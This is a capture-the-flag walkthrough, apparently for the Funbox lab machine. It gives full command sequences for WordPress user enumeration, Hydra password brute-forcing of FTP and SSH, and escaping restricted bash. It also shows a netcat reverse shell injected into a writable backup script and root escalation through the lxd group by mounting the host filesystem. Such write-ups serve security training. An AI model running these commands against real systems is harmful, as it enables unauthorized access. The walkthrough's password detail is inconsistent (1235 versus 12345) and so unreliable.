nmap shows ports 21, 22, 80, 33060 open

running a gobuster on port 80 reveals it is a wpsite
```zsh
#we start with a general run, and then enumerating users
wpscan --url http://funbox.fritz.box
wpscan --url http://funbox.fritz.box --enumerate users
#we find users joe and admin

#So we run a bruteforce for ftp using a cewl wordlist from the webpage, to no luck
hydra -l joe -P lc_words.txt -f ftp://192.168.109.77

#So we go ahead with rockyou wordlist
hydra -l joe -P /usr/share/wordlists/rockyou.txt -f ftp://192.168.109.77
#we get a hit on password 1235
#same with ssh
hydra -l joe -P /usr/share/wordlists/rockyou.txt -f ssh://192.168.109.77

ssh joe@192.168.109.77 #12345
```
Jeo!

---
Immideately, we see it is restricted bash. To breakout of it,
```zsh
cat ~/alias_scripts/rbash_breakout.txt

vi
:set shell=/bin/sh
:shell
#we get a proper shell now
#OR
ssh joe@IP -t "bash --noprofile"

#There's a mail, from root, that says "tell funny, backup is ready"
#Funny is another user
#we see a html.tar file in funny's home
#presumably the backup script runs routinely on /var?
ls -la
#shows a .baskup.sh script, writable to us.
#also another text file that says the backups are run routinely
#Can be verified by pspys
echo "mkfifo /tmp/f; nc [LOCAL-IP] [PORT] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f" >> .backup.sh
#wait for a shell by the user "funny"
```
funny!

---
```zsh
id
#shows lxd group
/snap/bin/lxd init
#Put none for ipv6. press enter for rest of the prompts
/snap/bin/lxc image import ./alpine-v3.23-x86_64-20260108_1217.tar.gz --alias myimage

lxc init myimage ignite -c security.privileged=true

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

lxc start ignite
lxc exec ignite /bin/sh

cd /mnt/root/root
```